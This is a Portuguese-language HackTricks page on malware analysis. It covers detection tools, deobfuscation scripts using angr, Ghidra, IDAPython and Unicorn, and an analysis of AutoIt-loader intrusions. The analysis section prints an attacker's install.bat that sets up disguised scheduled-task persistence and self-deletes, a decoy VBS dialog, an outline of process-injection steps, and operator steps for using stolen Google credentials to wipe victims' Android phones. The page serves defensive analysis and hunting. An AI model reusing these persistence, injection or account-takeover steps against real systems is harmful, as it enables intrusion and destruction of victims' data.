# Análise de Malware

{{#include ../../banners/hacktricks-training.md}}

## CheatSheets de Forense

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Serviços Online

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Ferramentas Offline de Antivírus e Detecção

### Yara

#### Instalação
```bash
sudo apt-get install -y yara
```
#### Preparar regras

Use este script para baixar e mesclar todas as regras yara para malware do github: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Crie o diretório _**rules**_ e execute-o. Isso criará um arquivo chamado _**malware_rules.yar**_ que contém todas as regras yara para malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Varredura
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Verificar malware e criar rules

Você pode usar a ferramenta [**YaraGen**](https://github.com/Neo23x0/yarGen) para gerar yara rules a partir de um binário. Confira estes tutoriais: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalação
```
sudo apt-get install -y clamav
```
#### Varredura
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detects potentially malicious **capabilities** in executables: PE, ELF, .NET. So it will find things such as Att\&ck tactics, or suspicious capabilities such as:

- check for OutputDebugString error
- run as a service
- create process

Obtenha-o no [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC means Indicator Of Compromise. Um IOC é um conjunto de **condições que identificam** algum software potencialmente indesejado ou **malware** confirmado. Blue Teams usam esse tipo de definição para **procurar por esse tipo de arquivos maliciosos** em seus **sistemas** e **redes**.\
Compartilhar essas definições é muito útil, pois quando malware é identificado em um computador e um IOC para esse malware é criado, outros Blue Teams podem usá‑lo para identificar o malware mais rapidamente.

A ferramenta para criar ou modificar IOCs é [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\
Você pode usar ferramentas como [**Redline**](https://www.fireeye.com/services/freeware/redline.html) para **procurar por IOCs definidos em um dispositivo**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) é um scanner para Indicadores Simples de Comprometimento.\
A detecção é baseada em quatro métodos de detecção:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) é um malware scanner para Linux lançado sob a licença GNU GPLv2, projetado em torno das ameaças enfrentadas em ambientes de hospedagem compartilhada. Ele usa dados de ameaça provenientes de sistemas de detecção de intrusão na borda da rede para extrair malware que está sendo usado ativamente em ataques e gera assinaturas para detecção. Além disso, dados de ameaça também são obtidos a partir de submissões de usuários com o recurso LMD checkout e de recursos da comunidade de malware.

### rkhunter

Ferramentas como [**rkhunter**](http://rkhunter.sourceforge.net) podem ser usadas para verificar o filesystem em busca de possíveis **rootkits** e malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) é uma ferramenta que tenta encontrar obfuscated strings dentro de executables usando diferentes técnicas.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) verifica alguns itens básicos dentro do executable (binary data, entropy, URLs and IPs, some yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) é uma ferramenta que permite obter informações de Windows executables tais como imports, exports, headers, mas também verifica o virus total e encontra potenciais Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) é uma ferramenta para detectar se um arquivo está **encrypted** e também encontrar **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) é um script Python que usa uma variedade de **métodos estatísticos** para detectar conteúdo **obfuscated** e **encrypted** dentro de arquivos de texto/script. O propósito do NeoPI é auxiliar na **detecção de hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) faz o seu melhor para detectar **obfuscated**/**dodgy code** assim como arquivos usando funções **PHP** frequentemente usadas em **malwares**/webshells.

### Apple Binary Signatures

Ao verificar algum **malware sample** você deve sempre **check the signature** do binary, pois o **developer** que o assinou pode já estar **related** com **malware.**
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Técnicas de Detecção

### File Stacking

Se você sabe que alguma pasta contendo os **arquivos** de um web server foi **atualizada pela última vez em alguma data**, **verifique** a **data** em que todos os **arquivos** no **web server** foram criados e modificados e, se alguma data for **suspeita**, inspecione esse arquivo.

### Baselines

Se os arquivos de uma pasta **não deveriam ter sido modificados**, você pode calcular o **hash** dos **arquivos originais** da pasta e **compará-los** com os atuais. Qualquer coisa modificada será **suspeita**.

### Statistical Analysis

Quando a informação é salva em logs, você pode **verificar estatísticas como quantas vezes cada arquivo do web server foi acessado**, já que um web shell pode ser um dos mais acessados.

---

### Android in-app native telemetry (no root)

No Android, você pode instrumentar código nativo dentro do processo do app alvo pré-carregando uma biblioteca de logger pequena antes que outras libs JNI inicializem. Isso dá visibilidade precoce do comportamento nativo sem system-wide hooks ou root. Uma abordagem popular é SoTap: coloque libsotap.so para a ABI correta dentro do APK e injete uma chamada System.loadLibrary("sotap") cedo (por exemplo, inicializador estático ou Application.onCreate), então colete logs de caminhos internos/externos ou use Logcat como fallback.

Veja a página Android native reversing para detalhes de configuração e caminhos dos logs:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Alguns malwares Android e apps protegidos por RASP escondem nomes de métodos JNI e assinaturas decodificando-os em tempo de execução antes de chamar RegisterNatives. Quando a instrumentação Frida/ptrace é encerrada por anti-debug, você ainda pode recuperar o texto claro offline executando o decodificador embutido no binário com angr e então empurrando os resultados de volta para Ghidra como comentários.

Ideia-chave: trate o decodificador dentro do .so como uma função chamável, execute-o sobre os blobs de bytes ofuscados em .rodata, e concretize os bytes de saída até o primeiro \x00 (C-string terminator). Mantenha angr e Ghidra usando a mesma image base para evitar desencontros de endereços.

Visão geral do workflow
- Triage em Ghidra: identifique o decodificador e sua convenção de chamada/argumentos em JNI_OnLoad e na configuração de RegisterNatives.
- Execute angr (CPython3) para executar o decodificador para cada string alvo e despejar os resultados.
- Anote no Ghidra: comente automaticamente strings decodificadas em cada local de chamada para reconstrução rápida do JNI.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad so Ghidra recognises JNINativeMethod structures.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Look for calls to RegisterNatives. If the library constructs the name/signature with a local routine (e.g., FUN_00100e10) that references a static byte table (e.g., DAT_00100bf4) and takes parameters like (encoded_ptr, out_buf, length), that is an ideal target for offline execution.

angr setup (execute the decoder offline)
- Load the .so with the same base used in Ghidra (example: 0x00100000) and disable auto-loading of external libs to keep the state small.

<details>
<summary>Configuração do angr e execução offline do decodificador</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Em larga escala, construa um mapa estático dos call sites para os argumentos do decoder (encoded_ptr, size). Wrappers podem ocultar argumentos, então você pode criar esse mapeamento manualmente a partir de Ghidra xrefs se a API recovery estiver ruidosa.

<details>
<summary>Decodificar em lote múltiplos call sites com angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Anotar locais de chamada no Ghidra
Option A: Gravador de comentários apenas Jython (use um JSON pré-computado)
- Como angr requer CPython3, mantenha desofuscação e anotação separadas. Primeiro execute o script angr acima para produzir decoded_strings.json. Em seguida execute este GhidraScript Jython para escrever PRE_COMMENTs em cada call site (e incluir o nome da função chamadora para contexto):

<details>
<summary>Script Jython do Ghidra para anotar strings JNI decodificadas</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opção B: Script CPython único via pyhidra/ghidra_bridge
- Alternativamente, use pyhidra ou ghidra_bridge para controlar a API do Ghidra a partir do mesmo processo CPython que executa angr. Isso permite chamar decode_string() e imediatamente definir PRE_COMMENTs sem um ficheiro intermédio. A lógica espelha o Jython script: construir o mapa callsite→function via ReferenceManager, decodificar com angr e definir comentários.

Por que isso funciona e quando usar
- A execução offline evita RASP/anti-debug: não é necessário ptrace, nem hooks do Frida para recuperar strings.
- Manter Ghidra e angr com base_addr alinhados (por exemplo, 0x00100000) garante que os endereços de função/dados correspondam entre as ferramentas.
- Receita repetível para decoders: trate a transformação como uma função pura, aloque um output buffer num estado limpo, chame-a com (encoded_ptr, out_ptr, len), depois concretize via state.solver.eval e analise C-strings até \x00.

Notas e armadilhas
- Respeite a ABI/calling convention do alvo. angr.factory.callable escolhe uma com base em arch; se os argumentos parecerem deslocados, especifique cc explicitamente.
- Se o decoder espera output buffers zerados, inicialize outbuf com zeros no state antes da chamada.
- Para .so Android independente de posição, sempre forneça base_addr para que os endereços em angr correspondam aos vistos no Ghidra.
- Use currentProgram.getReferenceManager() para enumerar call-xrefs mesmo se o app encapsular o decoder atrás de thin stubs.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuscating Dynamic Control-Flow (JMP/CALL RAX Dispatchers)

Modern malware families heavily abuse Control-Flow Graph (CFG) obfuscation: instead of a direct jump/call they compute the destination at run-time and execute a `jmp rax` or `call rax`.  A small *dispatcher* (typically nine instructions) sets the final target depending on the CPU `ZF`/`CF` flags, completely breaking static CFG recovery.

The technique – showcased by the SLOW#TEMPEST loader – can be defeated with a three-step workflow that only relies on IDAPython and the Unicorn CPU emulator.

### 1. Locate every indirect jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Extrair o byte-code do dispatcher
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emule-o duas vezes com Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Execute `run(code,0,0)` e `run(code,1,1)` para obter os alvos do branch *false* e *true*.

### 4. Aplicar patch para restaurar um direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Após patching, force o IDA a reanalisar a função para que o CFG completo e a saída do Hex-Rays sejam restaurados:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Rotular chamadas indiretas de API

Uma vez que o destino real de cada `call rax` seja conhecido, você pode informar ao IDA o que é para que os tipos de parâmetros & nomes de variáveis sejam recuperados automaticamente:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Benefícios práticos

* Restaura o CFG real → a decompilação passa de *10* linhas para milhares.
* Habilita string-cross-reference & xrefs, tornando a reconstrução do comportamento trivial.
* Scripts são reutilizáveis: coloque-os em qualquer loader protegido pelo mesmo truque.

---

## Loaders baseados em AutoIt: .a3x decryption, Task Scheduler masquerade and RAT injection

Este padrão de intrusão encadeia um MSI assinado, loaders AutoIt compilados para .a3x, e um job do Task Scheduler fazendo-se passar por um app benigno.

### MSI → custom actions → orquestrador AutoIt

Árvore de processos e comandos executados pelas custom actions do MSI:

- MsiExec.exe → cmd.exe para executar install.bat
- WScript.exe para mostrar um diálogo de erro de isca
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (solta loader, configura persistence, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (user decoy):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Deposita AutoIt3.exe e IoKlTr.au3 em C:\Users\Public\Music
- Copia schtasks.exe para hwpviewer.exe (mascarando-se como Hangul Word Processor viewer)
- Cria uma tarefa agendada "IoKlTr" que executa a cada 1 minuto
- LNK de inicialização visto como Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Implanta módulos em %APPDATA%\Google\Browser\ subpastas contendo `adb` ou `adv` e os inicia via helpers autoit.vbs/install.bat

Forensic triage tips:
- Enumeração de schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Procure por cópias renomeadas de schtasks.exe co-localizadas com o Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Caminhos comuns: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Correlacione criação de processos: AutoIt3.exe iniciando binários legítimos do Windows (por exemplo, cleanmgr.exe, hncfinder.exe)

### Loaders AutoIt e decriptação de payload .a3x → injeção

- Módulos AutoIt são compilados com `#AutoIt3Wrapper_Outfile_type=a3x` e decriptam payloads embutidos antes de injetá-los em processos benignos.
- Famílias observadas: QuasarRAT (injetado em hncfinder.exe) e RftRAT/RFTServer (injetado em cleanmgr.exe), assim como módulos RemcosRAT (`Remcos\RunBinary.a3x`).
- Padrão de decriptação: derivar uma chave AES via HMAC, decriptar o blob embutido e então injetar o módulo em texto plano.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Fluxo comum de injeção (CreateRemoteThread-style):
- CreateProcess (suspended) do host alvo (ex.: cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory com módulo/shellcode decriptado
- CreateRemoteThread ou QueueUserAPC para executar o payload

Ideias de hunting
- AutoIt3.exe parented por MsiExec.exe ou WScript.exe que instanciam utilitários do sistema
- Arquivos com extensão `.a3x` ou runners de script AutoIt em caminhos públicos/escrituráveis pelo usuário
- Scheduled tasks suspeitas executando AutoIt3.exe ou binários não assinados pela Microsoft, com gatilhos em nível de minuto

### Account-takeover abuse of Android Find My Device (Find Hub)

Durante a intrusão no Windows, os operadores usaram credenciais Google roubadas para apagar repetidamente os dispositivos Android da vítima, suprimindo notificações enquanto expandiam o acesso via o messenger do desktop onde a vítima estava logada.

Passos do operador (a partir de uma sessão de navegador autenticada):
- Verificar Google Account → Security → Your devices; acessar Find My Phone → Find Hub (https://www.google.com/android/find)
- Selecionar dispositivo → reentrar a senha do Google → emitir "Erase device" (factory reset); repetir para atrasar a recuperação
- Opcional: limpar e-mails de alerta na caixa de correio vinculada (ex.: Naver) para ocultar notificações de segurança

## AdaptixC2: Configuration Extraction and TTPs

Veja a página dedicada:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Referências

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)

{{#include ../../banners/hacktricks-training.md}}
